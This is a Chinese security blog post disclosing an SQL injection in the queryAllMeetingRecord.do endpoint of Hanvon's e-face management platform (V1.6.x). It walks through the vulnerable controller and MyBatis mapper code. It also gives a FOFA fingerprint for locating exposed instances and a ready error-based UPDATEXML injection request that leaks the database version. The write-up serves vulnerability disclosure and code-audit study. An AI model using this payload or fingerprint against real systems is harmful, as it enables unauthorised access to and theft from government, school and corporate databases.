---
title: "汉王e脸通综合管理平台 queryAllMeetingRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryAllMeetingRecord-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryallmeetingrecord.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryAllMeetingRecord.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/2 08:27
- 1025浏览
- [0评论](#comment)
- 51分钟阅读

深入探索

数据库

应用

SQL

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryAllMeetingRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `MobiMeetingAppController` 里关于 `queryAllMeetingRecord` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryAllMeetingRecord.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult queryAllMeetingRecord(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "meetingName") String meetingName, @RequestParam(required = false,value = "meetingRoom") Long meetingRoomId, @RequestParam(required = false,value = "state") Integer state, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token) {
        new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            MethodResult methodResult;
            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = Constants.PAGE_SIZE;
                }

                MeetingParam meetingParam = new MeetingParam();
                meetingParam.setMtName(meetingName);
                meetingParam.setMrId(meetingRoomId);
                meetingParam.setMtStartTime(start);
                meetingParam.setMtEndTime(end);
                if (state != null) {
                    meetingParam.setState(state);
                }

                meetingParam.setColumnKey(columnKey);
                meetingParam.setOrder(order);
                PageHelper.startPage(page, pageSize);
                List<MeetingTpm> list = this.meetingAsm.queryMeetingRecord(meetingParam);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingDsm.xml

代码安全审计

```
<!--查询会议预约记录列表-->
    <select id="queryMeetingRecord" parameterType="com.hanvon.iface.tpm.meeting.tpm.MeetingTpm"
            resultMap="ResultMapVO">
        SELECT MT.ID,MT.MT_NAME,MT.MT_DATE,MT.MT_START_TIME,MT.MT_END_TIME,MT.MT_SIGNIN_STARTTIME,
        MT.MT_SIGNIN_ENDTIME,MT.MR_ID,MT.MT_CONTENT,MT.MT_COMMENT,MT.MT_DELETE,MT.MT_STATE,MT.MT_CREATE_TIME,MT.MT_DEVICE_ID,MT_IS_SIGNIN,MT_IS_SIGNOUT,
        MT.MT_DEVICE_NAME,MT.MT_SIGNOUT_STARTTIME,MT.MT_SIGNOUT_ENDTIME,SU.SZ_NAME as applicant,sb.sz_name as
        branchName,
        MMT.MR_NAME AS MRNAME,(SELECT COUNT(1) FROM mt_meeting_file MMF WHERE MMF.MT_ID = MT.ID) AS SUM
        <!--mh.mh_name as mhName,mh.mh_introduce as mhIntroduce ,mh.mh_photo_path as mhPhotoPath-->
        FROM mt_meeting MT
        LEFT JOIN mt_meeting_room MMT ON MT.MR_ID = MMT.ID
        LEFT JOIN sys_user_sys SU ON MT.MT_CREATE_ID = SU.NG_ID
        LEFT JOIN sys_branch sb on sb.ng_id = (SELECT sub.ng_branch_id from sys_user_branch sub where sub.ng_user_id
        =MT.MT_CREATE_ID )
        <!-- LEFT JOIN mt_honored_guest mh on mh.mt_id = MT.id-->
        WHERE MT.MT_DELETE = 1 AND MT.MT_STATE=1
        <if test="keys != null">
            AND (
            SU.SZ_NAME like CONCAT('%',#{keys},'%')
            )
        </if>
        <if test="state != null and state != ''">
            AND MT.MT_STATE= #{state}
        </if>
        <if test="mtName != null and mtName != ''">
            AND MT.MT_NAME like CONCAT('%',#{mtName},'%')
        </if>
        <if test="mtStartTime != null">
            AND DATE(MT.MT_DATE) &gt;= DATE(#{mtStartTime,jdbcType=VARCHAR})
        </if>
        <if test="mtEndTime != null">
            AND DATE(#{mtEndTime,jdbcType=VARCHAR}) &gt;= DATE(MT.MT_DATE)
        </if>
        <if test="mrId != null">
            and MT.MR_ID = #{mrId}
        </if>
        <if test="mtDate != null">
            and MT.MT_DATE = #{mtDate,jdbcType=VARCHAR}
        </if>
        ORDER BY
        <if test="order == null or order == ''">
            MT.MT_CREATE_TIME desc
        </if>
        <if test="order != null and order != ''">
            ${columnKey} ${order}
        </if>
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取

```
GET /manage/mobiMeetingApp/queryAllMeetingRecord.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&recordId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 queryAllMeetingRecord.do SQL注入漏洞](images/img-001-8289b586c9a6.webp)](https://image.mrxn.net/3748707ccf4440e989b1ff17906fb8cd.webp)

成功通过报错注入爆出数据库版本信息

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

软件
